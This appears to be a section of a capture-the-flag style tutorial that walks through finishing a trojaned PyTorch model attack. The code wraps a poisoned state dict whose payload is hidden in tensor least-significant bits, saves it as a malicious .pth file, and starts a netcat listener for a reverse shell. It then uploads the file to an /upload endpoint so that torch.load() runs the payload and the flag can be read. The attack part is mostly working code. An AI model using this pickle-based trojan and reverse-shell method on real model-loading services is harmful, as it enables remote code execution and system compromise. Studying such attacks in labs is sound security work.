# Execute the Attack

---

To actually execute the actually, we first need to create an instance of`TrojanModelWrapper`, and pass the entire`modified_state_dict`to its constructor, along with the`target_key`(specifying which tensor holds the payload, e.g.,`"large_layer.weight"`), as well as the`NUM_LSB`used for encoding. The wrapper's`__init__`method pickles this entire`state_dict`and stores the resulting bytes internally.

We then save this`wrapper_instance`object to our final malicious file (`final_malicious_file`) using`torch.save()`. This file now contains the pickled representation of the`TrojanModelWrapper`.

Code:python```
`# Ensure the modified state dict exists from the embedding stepif"modified_state_dict"notinlocals()ornotisinstance(modified_state_dict,dict):raiseNameError("Critical Error: 'modified_state_dict' not found or invalid. Cannot create wrapper.")# Ensure the target key used for embedding is correctly definedif"target_key"notinlocals():raiseNameError("Critical Error: 'target_key' variable not defined. Cannot create wrapper.")print(f"\n--- Instantiating TrojanModelWrapper ---")try:# Create an instance of our wrapper class.# Pass the entire modified state dictionary, the key identifying the# payload tensor within that dictionary, and the LSB count.# The wrapper's __init__ pickles the state_dict internally.wrapper_instance=TrojanModelWrapper(modified_state_dict=modified_state_dict,target_key=target_key,num_lsb=NUM_LSB,)print("TrojanModelWrapper instance created successfully.")print("The wrapper instance now internally holds the pickled bytes of the entire modified state_dict.")exceptExceptionase:print(f"\n--- Error Instantiating Wrapper ---")print(f"Error:{e}")raiseSystemExit("Failed to instantiate TrojanModelWrapper.")frome# Define the filename for our final malicious artifactfinal_malicious_file="malicious_trojan_model.pth"print(f"\n--- Saving the Trojan Wrapper Instance to '{final_malicious_file}' ---")try:torch.save(wrapper_instance,final_malicious_file)print(f"Final malicious Trojan file saved successfully to '{final_malicious_file}'.")print(f"File size:{os.path.getsize(final_malicious_file)}bytes.")exceptExceptionase:# Catch potential errors during the final save operationprint(f"\n--- Error Saving Final Malicious File ---")importtraceback

    traceback.print_exc()print(f"Error details:{e}")raiseSystemExit("Failed to save the final malicious wrapper file.")frome`
```

The only thing left is to execute the attack.

First we need to double-check the payload configuration. We must ensure the`HOST_IP`variable, set earlier when defining the payload, correctly points to the IP address of the machine where we will run our listener, and that this IP is reachable from the target's environment. Next, we start a network listener on our machine to catch the incoming reverse shell.

A common tool for this is`netcat`; run`nc -lvnp 4444`.

With the listener active, we upload our malicious model file to the spawned instance. The application exposes an`/upload`endpoint designed to receive model files. Use the Python script below (or a tool like`curl`) to perform the upload via an HTTP POST request.

Code:python```
`importrequestsimportosimporttraceback

api_url="http://localhost:5555/upload"# Replace with instance detailspickle_file_path=final_malicious_fileprint(f"Attempting to upload '{pickle_file_path}' to '{api_url}'...")# Check if the malicious pickle file exists locallyifnotos.path.exists(pickle_file_path):print(f"\nError: File not found at '{pickle_file_path}'.")print("Please ensure the file exists in the specified path.")else:print(f"File found at '{pickle_file_path}'. Preparing upload...")# Prepare the file for upload in the format requests expects# The key 'model' must match the key expected by the Flask app (request.files['model'])files_to_upload={"model":(os.path.basename(pickle_file_path),open(pickle_file_path,"rb"),"application/octet-stream",)}try:# Send the POST request with the fileprint("Sending POST request...")response=requests.post(api_url,files=files_to_upload)# Print the server's response detailsprint("\n--- Server Response ---")print(f"Status Code:{response.status_code}")try:# Try to print JSON response if availableprint("Response JSON:")print(response.json())exceptrequests.exceptions.JSONDecodeError:# Otherwise, print raw text responseprint("Response Text:")print(response.text)print("--- End Server Response ---")ifresponse.status_code==200:print("\nUpload successful (HTTP 200). Check your listener for a connection.")else:print(f"\nUpload failed or server encountered an error (Status code:{response.status_code}).")exceptrequests.exceptions.ConnectionErrorase:print(f"\n--- Connection Error ---")print(f"Could not connect to the server at '{api_url}'.")print("Please ensure:")print("  1. The API URL is correct.")print("  2. Your target instance is running and the port is mapped correctly.")print("  3. There are no network issues (e.g., firewall).")print("  4. You have a listener running for the connection.")print(f"Error details:{e}")print("--- End Connection Error ---")exceptExceptionase:print(f"\n--- An unexpected error occurred during upload ---")traceback.print_exc()print(f"Error details:{e}")print("--- End Unexpected Error ---")finally:# Ensure the file handle opened for upload is closedif"files_to_upload"inlocals()and"model"infiles_to_upload:try:files_to_upload["model"][1].close()# print("Closed file handle for upload.")exceptExceptionase_close:print(f"Warning: Error closing file handle:{e_close}")print("\nUpload script finished.")`
```

Upon successful upload, the server will attempt to load the model using`torch.load()`.

We should see an incoming connection on our`nc`listener. Once we have the shell connection, we can navigate the target's system to find and retrieve the flag (`cat /app/flag.txt`).